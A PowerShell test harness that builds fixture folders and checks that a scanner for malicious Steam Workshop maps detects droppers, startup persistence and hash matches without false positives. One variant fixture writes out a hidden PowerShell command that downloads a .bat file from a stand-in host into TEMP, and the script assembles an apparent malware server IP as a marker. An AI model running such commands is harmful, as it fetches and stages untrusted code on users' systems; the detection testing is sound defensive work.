<#
    Builds a throwaway fixture tree and runs scan-windows.ps1 against it,
    asserting that every check fires. Also runs the scanner against a clean
    tree to prove it reports nothing found -- and that it still prints the
    "this is not proof you are clean" caveat.

    Fixtures are generated here rather than committed: a repo containing a .bat
    with the real payload string would be flagged by antivirus and by GitHub.
    Everything written below is inert -- echo statements only -- and the marker
    string is assembled from fragments at runtime.

    Run:  powershell -NoProfile -ExecutionPolicy Bypass -File tests\make-fixtures.ps1
#>

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

$Here    = Split-Path -Parent $MyInvocation.MyCommand.Path
$Repo    = Split-Path -Parent $Here
$Fix     = Join-Path $Here 'fixtures'
$Scanner = Join-Path $Repo 'scan-windows.ps1'
$AppId   = '4704690'

$script:Pass = 0
$script:Fail = 0
function Ok  { param($m) Write-Host "  PASS  $m" -ForegroundColor Green; $script:Pass++ }
function Bad { param($m) Write-Host "  FAIL  $m" -ForegroundColor Red;   $script:Fail++ }
function Check { param([bool]$Cond, [string]$Msg) if ($Cond) { Ok $Msg } else { Bad $Msg } }

# Assembled at runtime so no file in this repo contains a live payload URL.
$MarkIp  = '31.57' + '.34.228'
$MarkBat = 'steamb' + '.bat'

if (Test-Path -LiteralPath $Fix) { Remove-Item -LiteralPath $Fix -Recurse -Force }
New-Item -ItemType Directory -Path $Fix -Force | Out-Null

# ------------------------------------------------------------- infected tree

$Dirty = Join-Path $Fix 'dirty'
$Ws    = Join-Path $Dirty "steamroot\steamapps\workshop\content\$AppId"

foreach ($d in @("$Ws\3765145606", "$Ws\9999999999", "$Ws\7777777777", "$Ws\1111111111",
                 "$Dirty\home\Documents", "$Dirty\home\Startup")) {
    New-Item -ItemType Directory -Path $d -Force | Out-Null
}

# A map whose ID is on the known-bad list (check 2).
Set-Content -LiteralPath "$Ws\3765145606\map.pak" -Value 'harmless placeholder'

# A .pak carrying the marker as UTF-16LE, like an Unreal string literal (check 4).
$bytes = [byte[]]@() `
    + [System.Text.Encoding]::ASCII.GetBytes('PAKFILEHEADER') `
    + [System.Text.Encoding]::Unicode.GetBytes($MarkIp) `
    + [System.Text.Encoding]::ASCII.GetBytes('PADDING')
[System.IO.File]::WriteAllBytes("$Ws\9999999999\marker.pak", $bytes)

# A .pak we will pin by hash (check 3).
Set-Content -LiteralPath "$Ws\7777777777\known.pak" -Value 'this stands in for the known malicious pak'
$KnownHash = (Get-FileHash -LiteralPath "$Ws\7777777777\known.pak" -Algorithm SHA256).Hash.ToLower()

# A perfectly ordinary map, to prove we do not flag everything.
Set-Content -LiteralPath "$Ws\1111111111\clean.pak" -Value 'a completely normal community map'

# The dropped file, in Documents where the malware writes it (check 5).
Set-Content -LiteralPath "$Dirty\home\Documents\s.bat" -Value @(
    '@echo off',
    'echo inert test fixture - this file does nothing'
)

# A renamed variant carrying a marker (check 5, renamed-file path).
Set-Content -LiteralPath "$Dirty\home\Documents\notes.cmd" -Value @(
    '@echo off',
    'echo inert test fixture',
    "REM $MarkBat"
)

# A startup file referring to the malware (check 6).
Set-Content -LiteralPath "$Dirty\home\Startup\definitely-not-malware.bat" -Value @(
    '@echo off',
    "REM $MarkBat"
)

# Test indicator file: same schema, but with one hash swapped for our stand-in
# so the hash-matching path is genuinely exercised.
$TestIoc = Join-Path $Fix 'indicators.test.json'
(Get-Content -LiteralPath (Join-Path $Repo 'indicators.json') -Raw).Replace(
    '1ff540bc3c493a93059e602b414ba61027ed1a2b8a079f6197b0718f4a2101b6', $KnownHash
) | Set-Content -LiteralPath $TestIoc -Encoding UTF8

# ---------------------------------------------------------------- clean tree

$Clean = Join-Path $Fix 'clean'
New-Item -ItemType Directory -Path "$Clean\steamroot\steamapps\workshop\content\$AppId\2222222222" -Force | Out-Null
New-Item -ItemType Directory -Path "$Clean\home\Documents" -Force | Out-Null
New-Item -ItemType Directory -Path "$Clean\home\Startup"   -Force | Out-Null
Set-Content -LiteralPath "$Clean\steamroot\steamapps\workshop\content\$AppId\2222222222\nice.pak" `
            -Value 'a completely normal community map'

# -------------------------------------------------------------- variant tree
#
# A repackaged copy of the same malware: different Workshop ID, different file
# contents, different server. Every published indicator misses it. This is the
# case -Deep exists for, and the realistic one -- replacement maps appeared
# within hours of each takedown.

$Var = Join-Path $Fix 'variant'
$VWs = Join-Path $Var "steamroot\steamapps\workshop\content\$AppId\4242424242"
New-Item -ItemType Directory -Path $VWs -Force | Out-Null
New-Item -ItemType Directory -Path "$Var\home\Documents" -Force | Out-Null
New-Item -ItemType Directory -Path "$Var\home\Startup"   -Force | Out-Null

# Same dropper behaviour, none of the known strings.
Set-Content -LiteralPath "$Var\home\Documents\update_helper.bat" -Value @(
    '@echo off',
    'if not defined _Q set _Q=1 & start /min cmd /c %~f0 & exit',
    'powershell -w hidden -ep bypass -c iwr http://198.51.100.77/x/p.bat -OutFile %TEMP%\p.bat',
    'echo inert test fixture'
)

# A map reaching for capability it has no business having.
$vbytes = [byte[]]@() `
    + [System.Text.Encoding]::ASCII.GetBytes('PAKFILEHEADER') `
    + [System.Text.Encoding]::Unicode.GetBytes('GetPlatformUserDir') `
    + [System.Text.Encoding]::ASCII.GetBytes('SaveStringToFilePADDING')
[System.IO.File]::WriteAllBytes("$VWs\newmap.pak", $vbytes)

# ------------------------------------------------------------------ run them

Write-Host ''
Write-Host '  Scanning the INFECTED fixture tree'
Write-Host '  ----------------------------------'
$OutDirty = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
                -ScanRoot $Dirty -Indicators $TestIoc -NoColor 2>&1 | Out-String
$RcDirty = $LASTEXITCODE
($OutDirty -split "`r?`n") | ForEach-Object { Write-Host "  | $_" }
Write-Host ''

Check ($OutDirty -match 'Known malicious Workshop map is installed \(ID 3765145606\)') 'check 2  known-bad Workshop ID'
Check ($OutDirty -match 'matches a known malicious file exactly')                      'check 3  file hash match'
Check ($OutDirty -match 'Map file contains a known malware marker')                    'check 4  UTF-16 marker inside .pak'
Check ($OutDirty -match 'where the malware drops its file')                            'check 5  s.bat in Documents'
Check ($OutDirty -match 'A script here contains a known malware marker')               'check 5b renamed .cmd variant'
Check ($OutDirty -match 'A startup file refers to the malware')                        'check 6  Startup folder persistence'
Check ($OutDirty -match 'This tool has changed nothing')                               'states that nothing was modified'
Check (-not ($OutDirty -match 'clean\.pak'))                                           'did not flag the innocent map'
Check ($RcDirty -eq 1)                                                                 "exit code 1 when indicators found (got $RcDirty)"

Write-Host ''
Write-Host '  Scanning the CLEAN fixture tree'
Write-Host '  ------------------------------'
$OutClean = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
                -ScanRoot $Clean -Indicators (Join-Path $Repo 'indicators.json') -NoColor 2>&1 | Out-String
$RcClean = $LASTEXITCODE
($OutClean -split "`r?`n") | ForEach-Object { Write-Host "  | $_" }
Write-Host ''

Check ($OutClean -match 'No known indicators of this malware were found') 'reports nothing found'
Check ($OutClean -match 'not proof that you are clean')                   "keeps the 'not proof you are clean' caveat"
Check ($RcClean -eq 0)                                                    "exit code 0 when nothing found (got $RcClean)"

# --------------------------------------- repackaged variant, -Deep vs not

Write-Host ''
Write-Host '  Repackaged variant (new ID, new hash, new server)'
Write-Host '  -------------------------------------------------'

$RealIoc = Join-Path $Repo 'indicators.json'
$OutVarIoc = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
                 -ScanRoot $Var -Indicators $RealIoc -NoColor 2>&1 | Out-String
$RcVarIoc = $LASTEXITCODE
$OutVarDeep = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
                 -ScanRoot $Var -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-String
$RcVarDeep = $LASTEXITCODE

# This is the honest limitation, asserted rather than hand-waved: without
# -Deep, a repackaged copy is invisible.
Check ($OutVarIoc -match 'No known indicators of this malware were found') 'IOC-only mode misses the variant (documents the limitation)'
Check ($RcVarIoc -eq 0)                                                    "IOC-only exits 0 on the variant (got $RcVarIoc)"
Check ($OutVarDeep -match 'behaves like the malware')                     '-Deep catches the dropper pattern'
Check ($OutVarDeep -match 'launch programs, which maps do not need')       '-Deep catches Unreal capability abuse'
Check ($OutVarDeep -match 'worth a look')                                  '-Deep wording avoids claiming infection'
Check ($OutVarDeep -match 'Do not panic')                                  '-Deep tells the user most hits are false alarms'
Check ($RcVarDeep -eq 3)                                                   "-Deep exits 3 for behaviour-only hits (got $RcVarDeep)"

# The clean tree must stay clean even in deep mode -- otherwise the flag is
# useless noise.
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
    -ScanRoot $Clean -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-Null
Check ($LASTEXITCODE -eq 0) "-Deep stays quiet on a clean system (got $LASTEXITCODE)"

# ----------------------------------- behaviour corpus: evasion + benign
#
# The corpus is the real contract for -Deep. Detection has to survive an
# attacker rewriting the dropper, and stay silent on ordinary files. Both
# halves are load-bearing: a scanner that flags everything is as useless as
# one that flags nothing, because the audience cannot tell the difference.

Write-Host ''
Write-Host '  Behaviour corpus'
Write-Host '  ----------------'

. (Join-Path $Here 'corpus.ps1')
$Corp = Join-Path $Fix 'corpus'
Build-Corpus -Root $Corp

$EvRoot = Join-Path $Fix 'ev'; $BnRoot = Join-Path $Fix 'bn'
New-Item -ItemType Directory -Path "$EvRoot\home\Documents" -Force | Out-Null
New-Item -ItemType Directory -Path "$BnRoot\home\Documents" -Force | Out-Null
Copy-Item "$Corp\evasion\*" "$EvRoot\home\Documents\" -Recurse -Force
Copy-Item "$Corp\benign\*"  "$BnRoot\home\Documents\" -Force

$EvTotal = (Get-ChildItem "$Corp\evasion" -Recurse -File).Count
$OutEv = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
            -ScanRoot $EvRoot -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-String
$RcEv = $LASTEXITCODE
$EvHits = ([regex]::Matches($OutEv, 'behaves like the malware')).Count

Write-Host "  evasion variants detected: $EvHits/$EvTotal"
Check ($EvHits -eq $EvTotal) "every evasion variant is detected ($EvHits/$EvTotal)"
Check ($RcEv -eq 3)          "evasion corpus exits 3 (got $RcEv)"

# Name the specific regressions that motivated the rewrite, so a future change
# that reintroduces one fails with a message saying which.
foreach ($spec in @(
    @('02-abbrev-irm','parameter abbreviation and Invoke-RestMethod'),
    @('04-base64',    'fully base64-encoded payload'),
    @('05-caret',     'batch caret obfuscation'),
    @('08-mshta',     'mshta as the downloader'),
    @('15-subfolder', 'dropper in a Documents SUBfolder'))) {
    Check ($OutEv -match [regex]::Escape($spec[0])) "catches $($spec[1])"
}

# The base64 variant must be scored on its DECODED contents, not merely on the
# fact that something is encoded -- otherwise the decoder is decoration.
$b64line = ($OutEv -split "`r?`n" | Where-Object { $_ -match 'behaves like the malware' } |
            Where-Object { $_ -match 'runs downloaded text as code|downloads a file using .NET' })
Check ([bool]$b64line) 'base64 payload is decoded and scored, not just noticed'

$OutBn = & powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
            -ScanRoot $BnRoot -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-String
$RcBn = $LASTEXITCODE
$BnHits = ([regex]::Matches($OutBn, 'behaves like the malware')).Count

Write-Host "  benign scripts flagged:    $BnHits (want 0)"
Check ($BnHits -eq 0)                      "no false positives on ordinary scripts ($BnHits)"
Check ($RcBn -eq 0)                        "benign corpus exits 0 (got $RcBn)"
Check (-not ($OutBn -match 'WORTH A LOOK')) 'benign corpus raises no alarms at all'

# Losing the rule file must fail loudly rather than report a clean deep scan.
$rules = Join-Path $Repo 'behaviour-rules.tsv'
Move-Item $rules "$Fix\rules.bak" -Force
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
    -ScanRoot $BnRoot -Indicators $RealIoc -NoColor -Deep 2>&1 | Out-Null
Check ($LASTEXITCODE -eq 2) "missing behaviour rules exits 2, not a false 'clean'"
Move-Item "$Fix\rules.bak" $rules -Force

# ---------------------------------------------- refuses to run without IOCs

Write-Host ''
Write-Host '  Corrupt indicator file'
Write-Host '  ----------------------'
Set-Content -LiteralPath "$Fix\bad.json" -Value '{ "broken": true }'
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $Scanner `
    -ScanRoot $Clean -Indicators "$Fix\bad.json" -NoColor 2>&1 | Out-Null
Check ($LASTEXITCODE -eq 2) "exits 2 rather than reporting a false 'clean'"

# ------------------------------------------------------------------ summary

Get-ChildItem -LiteralPath $Repo -Filter 'meccha-check-report-*.txt' -ErrorAction SilentlyContinue |
    Remove-Item -Force -ErrorAction SilentlyContinue

Write-Host ''
Write-Host '  ============================================'
Write-Host ("   {0} passed, {1} failed" -f $script:Pass, $script:Fail)
Write-Host '  ============================================'
Write-Host ''
if ($script:Fail -gt 0) { exit 1 }
